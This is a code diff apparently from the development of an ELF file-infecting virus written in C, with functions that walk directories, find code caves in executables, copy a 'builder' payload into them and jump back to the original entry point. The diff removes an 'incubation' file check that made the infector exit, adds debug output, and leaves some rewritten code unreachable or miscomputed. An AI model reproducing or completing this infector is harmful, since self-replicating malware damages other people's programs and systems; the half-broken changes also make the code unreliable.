@@ -200,20 +200,10 @@ jump_back(int fd_self) {
 
     file_mmap(fd_self, &file_self);
 
-    uint64_t old_entry = old_entry_get(&file_self);
-
-    volatile char incubation[5];
-    incubation[0] = '4';
-    incubation[1] = '2';
-    incubation[2] = '4';
-    incubation[3] = '2';
-    incubation[4] = '\0';
-
-    int fd_is_incubator = ft_open(incubation, O_RDONLY, 0);
-    if (fd_is_incubator > 0) {
-        ft_close(fd_is_incubator);
+    volatile uint64_t old_entry = old_entry_get(&file_self);
+    if (old_entry == 0)
         ft_exit(0);
-    }
+
 
     Elf64_Ehdr *header = file_self.mem;
     uint64_t jump_to = header->e_entry + BUILDER_RE_ENTRY_OFFSET;
@@ -274,7 +264,7 @@ _start() {
 __attribute__((always_inline)) inline int
 infect_dir(volatile char *dir_path, volatile int fd_self) {
     int fd_dir = ft_open(dir_path, O_RDONLY, O_DIRECTORY);
-    if (fd_dir < 0) return fd_dir;
+    if (fd_dir < 0) return 0;
 
     const uint64_t FILE_NAME_MAX = 255;
     const uint64_t DIR_P_SIZE_WITHOUT_ALIGNMENT = FILE_NAME_MAX + sizeof(dirent64);
@@ -306,7 +296,6 @@ infect_dir(volatile char *dir_path, volatile int fd_self) {
             dirent_cur = (dirent64 *)((void *)dirent_cur + dirent_cur->d_reclen);
         }
     } while (bytes_read > 0);
-
     ft_close(fd_dir);
     return (0);
 }
@@ -353,20 +342,29 @@ infect_file(volatile char *path, volatile file *file_self) {
     uint64_t needed_space_table = code_caves_target_num * 16;
     uint64_t needed_space = entries_size_sum(entries_self, entries_self_num) + needed_space_table;
 
+    char ch = '^';
+    ft_write(1, &ch, 1);
+    ch = '\n';
     if (provided_space < needed_space) {
         file_munmap(&file_target);
         ft_close(fd_target);
         return 0;
     }
+
+    ch = '$';
+    ft_write(1, &ch, 1);
+    ch = '\n';
+
     uint64_t builder_target_start_offset = reserve_builder(&file_target, builder_self_start, builder_self_size, code_caves_target, code_caves_target_num);
     uint8_t not_enough_space_for_builder = builder_target_start_offset == 0;
+
     if (not_enough_space_for_builder) {
         file_munmap(&file_target);
         ft_close(fd_target);
         return 0;
     }
 
-    char ch = '!';
+    ch = '!';
     ft_write(1, &ch, 1);
     ch = '\n';
 
@@ -592,14 +590,24 @@ code_caves_get(volatile code_cave *code_caves, volatile file *file) {
             this_one_is_executable = section_header->sh_flags & SHF_EXECINSTR;
             section_cur_end = section_header->sh_offset + section_header->sh_size;
         } else {
-            if (!(section_old_end <= header->e_shoff && file->size >= header->e_shoff + header->e_shnum * header->e_shentsize)) {
-                if (file->size - section_old_end > 0xfff) return i;
-                code_caves[i].start = section_old_end;
-                code_caves[i].size = file->size - section_old_end;
-                code_caves[i].is_executable = last_one_was_executable;
+            char nl = '\n';
+            return i;
+            if (section_old_end >= file->size - section_old_end) return i;
+                if (section_old_end <= header->e_shoff)
+                {
+                    volatile uint64_t foo = 152;
+                    print_number(952);
 
-                i++;
-            }
+                    ft_write(1, &nl, 1);
+                    if (section_old_end + header->e_shnum * header->e_shentsize >= file->size) return i;
+                    ft_write(1, &nl, 1);
+
+                    code_caves[i].start = header->e_shnum + header->e_shnum * header->e_shentsize;;
+                    code_caves[i].size = file->size - code_caves[i].start;
+                    code_caves[i].is_executable = last_one_was_executable;
+
+                    i++;
+                }
             return i;
         }
 
@@ -636,7 +644,7 @@ get_next_section_header(uint64_t section_cur_end, file file) {
     return section_header_next;
 }
 
-__attribute__((always_inline)) inline uint64_t
+inline uint64_t
 offset_to_addr(volatile file *file, volatile uint64_t offset) {
     Elf64_Ehdr *header = file->mem;
 
@@ -649,7 +657,8 @@ offset_to_addr(volatile file *file, volatile uint64_t offset) {
 
     return 0;
 }
-__attribute__((always_inline)) inline uint64_t
+
+inline uint64_t
 addr_to_offset(volatile file *file, volatile uint64_t addr) {
     Elf64_Ehdr *header = file->mem;
 
@@ -663,68 +672,16 @@ addr_to_offset(volatile file *file, volatile uint64_t addr) {
     return 0;
 }
 //
-// __attribute__((always_inline)) inline void
-// print_number_hex(uint64_t num) {
-//     char buf[20]; // enough for up to 20 digits of 64-bit number
-//     int pos = 0;
-//
-//     // special case 0
-//     if (num == 0) {
-//         char c = '0';
-//         ft_write(1, &c, 1);
-//         return;
-//     }
-//
-//     // extract digits in reverse order
-//     while (num > 0) {
-//         uint64_t cur = num % 16;
-//         if (cur < 10)
-//             buf[pos++] = '0' + cur;
-//         else
-//             buf[pos++] = 'a' + cur - 10;
-//         num /= 16;
-//     }
-//
-//     // output digits in correct order
-//     while (pos > 0) {
-//         char c = buf[--pos];
-//         ft_write(1, &c, 1);
-//     }
-// }
-//
-// __attribute__((always_inline)) inline void
-// print_number(uint64_t num) {
-//     char buf[20]; // enough for up to 20 digits of 64-bit number
-//     int pos = 0;
-//
-//     // special case 0
-//     if (num == 0) {
-//         char c = '0';
-//         ft_write(1, &c, 1);
-//         return;
-//     }
-//
-//     // extract digits in reverse order
-//     while (num > 0) {
-//         buf[pos++] = '0' + (num % 10);
-//         num /= 10;
-//     }
-//
-//     // output digits in correct order
-//     while (pos > 0) {
-//         char c = buf[--pos];
-//         ft_write(1, &c, 1);
-//     }
-// }
-//
-__attribute__((always_inline)) inline uint64_t
+
+inline uint64_t
 code_caves_size_sum(volatile code_cave code_caves[], volatile uint64_t code_cave_num) {
     uint64_t total = 0;
     for (int i = 0; i < code_cave_num; i++)
         total += code_caves[i].size;
     return total;
 }
-__attribute__((always_inline)) inline uint64_t
+
+inline uint64_t
 entries_size_sum(volatile entry entries[], volatile uint64_t entries_num) {
     uint64_t total = 0;
     for (int i = 0; i < entries_num; i++)
@@ -733,7 +690,7 @@ entries_size_sum(volatile entry entries[], volatile uint64_t entries_num) {
 }
 
 // SYS CALLS
-__attribute__((always_inline)) inline long
+inline long
 sys(long n, long arg1, long arg2, long arg3, long arg4, long arg5, long arg6) {
     long ret;
     register long r10 __asm__("r10") = arg4;
